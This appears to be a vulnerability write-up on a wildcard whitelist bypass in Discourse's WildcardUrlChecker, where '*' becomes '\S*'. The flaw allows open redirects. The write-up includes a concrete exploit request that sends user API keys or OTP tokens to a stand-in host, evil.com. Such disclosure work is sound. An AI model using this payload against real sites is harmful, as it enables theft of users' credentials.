Title: Redirection Whitelist Bypass in WildcardUrlChecker leading to Open Redirect and Token Leakage
Analysis:
The `WildcardUrlChecker.check_url` method validates URLs against a whitelist with support for wildcard (`*`) domains. However, when converting the wildcard to a regular expression, it replaces `*` with `\S*` (matching any non-whitespace characters, including slashes). 

When a pattern like `https://*.discourse.org` is configured, the resulting regular expression is `\Ahttps://\S*\.discourse\.org\z`. 

An attacker can bypass this check by supplying an `auth_redirect` URL of the form:
`https://evil.com/bypass.discourse.org`

In this URL, the host is `evil.com`, and `/bypass.discourse.org` is the path. Since there are no spaces in the URL, `\S*` successfully matches `evil.com/bypass`, and the overall regex matches. This allows attackers to redirect authenticated sessions and leak sensitive user API keys or OTP tokens to an external server.

### Conceptual Exploit Payload
To trigger an open redirect or leak a user API key:
1. Send a request to `/user-api-key/new` or trigger `redirect_to_login_if_required` with parameters:
   `?user_api_public_key=[valid_rsa_key]&auth_redirect=https://evil.com/bypass.discourse.org`
2. The check passes, and the user is redirected to `https://evil.com/bypass.discourse.org?otp=true` or with `payload=...` containing the base64-encoded encrypted User API Key.
